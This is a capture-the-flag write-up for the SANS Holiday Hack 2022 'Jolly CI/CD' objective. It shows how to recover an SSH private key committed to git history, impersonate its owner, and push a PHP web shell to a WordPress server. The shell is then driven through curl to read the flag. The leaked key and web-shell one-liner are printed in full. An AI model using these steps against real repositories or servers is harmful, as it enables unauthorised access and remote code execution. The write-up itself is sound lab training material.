# OBJECTIVE 3 - Recover the Elfen Ring #
## 3C - Jolly CI/CD ##

### OBJECTIVE : ###
>Exploit a CI/CD pipeline.  Get hints for this challenge from Tinsel Upatree in the Elfen Ring.
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 3C</summary>
  
>-  The thing about Git is that every step of development is accessible – even steps you didn’t mean to take!  `git log` can show code skeletons.
>-	If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.
</details>

#  

## PROCEDURE : ##

First things first – let’s clone into the git repository that Tinsel Upatree told us about:
```console
$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
$ cd wordpress.flag.net.internal
```

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2022/assets/60655500/fb899de5-1778-440b-a331-4f27630283e9)
Tinsel Upatree conveniently tells us that; “WHOOPS” - at some point he committed something to git by mistake.  Having already completed the Trufflehog Search Objective, I immediately thought to bring up the git logs to see what commits have been made to the project.  
```console
$ git log
```
One of the commits is conveniently labelled with the comment `whoops`.
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2022/assets/60655500/fdc157ff-fec3-48df-98dc-e70834ffef7a)

So, let’s have a look at what it contains:
```console
$ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
```
We can immediately see the contents of what appears to be a public and private key pair.  It looks like somebody committed the contents of their `.ssh` directory by mistake!  We can also see a user-name: `knee-oh` and email address: `sporx@kringlecon.com` for this commit which might come in handy later.
```console
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets

diff --git a/.ssh/.deploy b/.ssh/.deploy
new file mode 100644
index 0000000..3f7a9e3
--- /dev/null
+++ b/.ssh/.deploy
@@ -0,0 +1,7 @@
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
new file mode 100644
index 0000000..8c0b43c
--- /dev/null
+++ b/.ssh/.deploy.pub
@@ -0,0 +1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
```

We can now use the information we have to create the necessary `id_rsa` files and hopefully be able to ssh into the repository and impersonate the user `knee-oh`.  To do this we need to copy and paste the private and public keys into two files called `id_rsa` and `id_rsa.pub` respectively – both of which are kept in the `.ssh` directory and set with permissions `chmod 600`.  [This website](https://gist.github.com/xirixiz/b6b0c6f4917ce17a90e00f9b60566278) was super helpful when it came to setting this up and testing it.
```console
$ mkdir /home/samways/.ssh
$ cd /home/samways/.ssh
$ touch id_rsa
$ nano id_rsa
```
 ### Contents of id_rsa: ###
 ```console
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```
```console
$ chmod 600 id_rsa
$ touch id_rsa.pub
$ nano id_rsa.pub
```
### Contents of id_rsa.pub: ###
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
```
```console
$ chmod 600 id_rsa.pub
```
Now we can finally test to see if we can ssh correctly:
```console
$ ssh -T git@gitlab.flag.net.internal
```

And sure enough – we are served up a welcome banner saying **Welcome to GitLab, @knee-oh!**  Oh what a glorious sight!
 ![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2022/assets/60655500/9da7fa29-a6b8-48e1-8786-155c153196f8)

By this point I think I’ve got a pretty good idea of what needs to be done next.  The objective expects us to return a flag of some sort; so, we’ll probably need to gain access to the server hosting the Wordpress site.  If we are able to access knee-oh’s gitlab account with his credentials we should be able to push whatever we want to the web server – maybe even a RCE script.  But first let’s remove the downloaded repo and re-clone it with knee-oh’s credentials by using git clone with ssh://.
```console
$ cd /home/samways
$ rm -rf wordpress.flag.net.internal
$ git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
$ cd wordpress.flag.net.internal
```

Next, we can impersonate knee-oh by setting his username and email address:
```console
$ git config user.name “knee-oh”
$ git config user.email “sporx@kringlecon.com”
```

Now we can create a simple php script for **Remote Code execution (RCE)**, commit it and push it to the live server.
```console
$ echo ‘<?php echo shell_exec($_GET[“cmd”]);?>’ > letmein.php
$ git add letmein.php
$ git commit -m “hahaha” 
$ git push
```
Checking out the logs we can confirm that it looks as if knee-oh pushed the file to the server:
```console
$ git log
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2022/assets/60655500/d3e45c53-86ca-46e7-bc5d-dedf5892b550)


 
We should now be able to call the Wordpress url using `curl` and pass on commands as arguments to the `php` and hopefully they will be executed by the webserver.  Surely enough by entering;
```console
$ curl http://wordpress.flag.net.internal/letmein.php?cmd=whoami
```
We get a reply from the webserver letting us know that our username is `www-data`.  Similarly, we can browse around the webserver using the `ls` command as follows to look at the root directory:
```console
$ curl http://wordpress.flag.net.internal/letmein.php?cmd=ls%20/.
```
Here we can see a file called `flag.txt` which we can look into by using `cat` in a similar fashion:
```console
$ curl http://wordpress.flag.net.internal/letmein.php?cmd=cat%20/./flag.txt
```
And there it is - the file contains the Elfen ring and our flag!

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2022/assets/60655500/484795ce-c6b7-493f-8827-c303be8ba270)

